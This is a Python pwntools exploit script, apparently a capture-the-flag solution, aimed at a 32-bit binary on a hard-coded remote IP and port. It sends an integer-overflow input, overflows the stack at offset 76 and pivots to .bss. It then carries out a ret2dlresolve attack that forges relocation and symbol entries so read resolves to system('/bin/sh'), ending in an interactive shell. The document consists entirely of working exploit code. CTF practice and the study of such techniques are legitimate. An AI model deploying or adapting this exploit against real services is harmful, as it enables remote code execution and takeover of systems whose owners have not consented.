from pwn import *
context.arch='i386'
p = remote('39.105.138.97','1234')
#p = process('./test')
elf = ELF('./test')

context.log_level = 'debug'

p.send(b'\x00'*0x30)
p.send(b'A'*0x20)
p.send('hello_boy')

pause()
p.sendline('-2147483648')
pause()
p.sendline('-1')

pause()
offset = 76
read_got = elf.got['read']
read_plt = elf.plt['read']
leave_ret = 0x080491a5
pop_ebp = 0x08049583

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_addr = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr
bss = elf.bss()+0x8
system_str = bss + 0x900
binsh_str = system_str + len('system') + 1 
fake_dynsym_addr = bss + 0x910
print('fake_dynsym_addr: '+hex(fake_dynsym_addr))
print('dynsym_addr: '+hex(dynsym_addr))


fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)
fake_rel_addr = fake_dynsym_addr + len(fake_dynsym)
fake_rel = p32(read_got) + p32((((fake_dynsym_addr - dynsym_addr) // 16) << 8) + 0x7)
payload1 = b'a'*offset + p32(pop_ebp) + p32(bss + 0x800) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss + 0x800) + p32(0x1000) 
p.sendline(payload1)
rop = b'\x00'*0x4 + p32(plt0) + p32(fake_rel_addr - rel_addr)
rop += p32(0) + p32(binsh_str)
payload2 = rop.ljust(0x900-0x800,b'\x00') + (b'system\x00/bin/sh\x00'.ljust(0x10,b'\x00'))
payload2 += fake_dynsym + fake_rel
pause()
p.sendline(payload2)

p.interactive()
